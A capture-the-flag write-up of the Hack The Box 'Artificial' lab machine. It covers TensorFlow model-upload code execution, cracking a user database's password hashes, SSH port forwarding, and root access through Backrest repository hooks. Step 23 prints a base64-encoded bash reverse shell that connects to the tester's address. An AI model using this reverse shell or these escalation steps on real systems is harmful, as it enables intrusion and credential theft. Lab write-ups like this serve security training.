# Artificial Machine Write-up

## Reconnaissance

1. **Starting with nmap. Only ports 22 and 80 are open.**

    ```bash
    ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.74 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sV -sC 10.10.11.74
    ```

    <SNIP>
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
    |   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
    |_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://artificial.htb/
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    <SNIP>

2. **Upon accessing the webpage (http://artificial.htb), a user register was performed, followed by the login.**

4. **After logging in, a file upload page was displayed. It was observed that the expected file format is Hierarchical Data Format v5 (HDF5).**

## Exploitation

5. **Using the exploit found at https://github.com/Splinter0/tensorflow-rce to generate an HDF5 file containing a reverse shell.**

6. **After the upload, it was possible to view the prediction and consequently run the uploaded file.**

## Initial Access

7. **Using a netcat server listening on port 443, a shell was obtained as the user ‘app’. Inside the application directory**

### Post-exploration

8. **In the ‘instances’ folder an SQLite ‘users.db’ file was found. Upon accessing the database, the ‘user’ table was found containing the user's password hashes.**

    ```bash
    sqlite3 instance/users.db

    1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8 
    2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
    3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
    4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
    5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
    6|admin|admin@gmail.com|21232f297a57a5a743894a0e4a801fc3
    7|test|test@test.com|098f6bcd4621d373cade4e832627b4f6
    ```
9. **Checking the /home and /etc/passwd, it was identified that a user named ‘gael’ exists on the system.** 

## Privilege Escalation - gael

10. **Some of these hashes could be cracked.** 

    ```bash
    ~$ hashcat -m 0 hashes.txt workspace/wordlists/rockyou.txt --show
    c99175974b6e192936d97224638a34f8:mattp005numbertwo
    bc25b1f80f544c0ab451c02a3dca9fc6:marwinnarak043414036
    21232f297a57a5a743894a0e4a801fc3:admin
    098f6bcd4621d373cade4e832627b4f6:test
    ```

11. **In possession of the passwords, it was possible to access the user ‘gael’ on the system. Then, an SSH connection was initialized.** 

### Post-exploration 

12. **Checking for gael’s groups, it was found that he belonged to the ‘sysadm’ group.**

    ```bash
    gael@artificial:~$ id
    uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
    ```

13. **Searching for files and directories that the group had permission, the file ‘/var/backups/backrest_backup.tar.gz’ was found, owned by the 'root' user.**

    ```bash
    gael@artificial:~$ find / -group sysadm -exec ls -ld {} \; 2>/dev/null
    -rw-r----- 1 root sysadm 52357120 Mar  4  2025 /var/backups/backrest_backup.tar.gz
    ```

14. **The file was unzipped, and relevant information was found, including a username and a bcrypt password hash, furthermore, clues for an application running on localhost 9898.**

    ```bash
    tar -xvf /var/backups/backrest_backup.tar.gz -C /tmp/.extract
    ```

    /tmp/.extract/backrest/.config/backrest/config.json
    ```bash    
    {
    "modno": 2,
    "version": 4,
    "instance": "Artificial",
    "auth": {
        "disabled": false,
        "users": [
        {
            "name": "backrest_root",
            "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
        }
        ]
    }
    }
    ```

    /tmp/.extract/backrest/install.sh
    ```bash  
    <SNIP>
    Environment="BACKREST_PORT=127.0.0.1:9898"
    
    <SNIP>

     <key>PATH</key>
        <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
        <key>BACKREST_PORT</key>
        <string>127.0.0.1:9898</string>
    </dict>

    <SNIP>
    
    echo "Logs are available at ~/.local/share/backrest/processlogs/backrest.log"
    echo "Access backrest WebUI at http://localhost:9898"
    ```

15. **The hash was cracked, then the password of backrest_root user was obtained.**

    ```bash
    hashcat -m 3200 -a 0 hash.txt rockyou.txt
    ```

    backrest_root : $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO : !@#$%^

### Accessing Backrest - Port Forwarding

16. **Next a local port forwarding was established via ssh, binding local port 1234 to the remote service running on port 9898.**

    ```bash
    ssh -L 1234:localhost:9898 gael@10.10.11.74
    ```

17. **When accessing ‘localhost:1234’, the login page of the Backrest 1.7.2 application was displayed. Authentication was successful using the user ‘backrest_root’ and the password ‘!@#$%^’.** 

18. **When logging in, it was observed that it was possible to create repositories. What led to thinking about the possibility of code execution.** 

## Privilege Escalation - root

19. **Upon initiating the repository creation, it was noted that it is possible to define hooks with arbitrary commands, and it is also necessary to specify the repository path.**

    local:/tmp/.extract/

20. **The repository was created and some initial payloads were used for testing.**

21. **The directories and files were created in ‘.extract’ and were owned by the 'root' user and group.**

22. **Further analysing the repository page, some sections were found, and it was observed that some of them allowed the executing of actions.**

23. **When creating the hook, it was possible to define the execution condition. The option ‘CONDITION_CHECK_START’ was chosen, and the following payload was used.**

    ```bash
    /bin/sh -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNDQzIDA+JjEK | base64 -d | bash’
    ```
    ![][image1]

    [image1]: files/htb-artificial-machine/image1.png


    ![][image2]

    [image2]: files/htb-artificial-machine/image2.png

24. **The Netcat server has started, and subsequently, the repository was submitted.**

### Root

25. **Then, on the created repository page the option ‘Check Now’ must be manually executed. This triggered the command inserted ‘CONDITION_CHECK_START’ which successfully executed and returned the reverse shell with root user.** 

    ![][image3]

    [image3]: files/htb-artificial-machine/image3.png

<div align="center">

## <a href=”https://labs.hackthebox.com/achievement/machine/2088593/668”>HTB Machine Certificate<a>

</div>
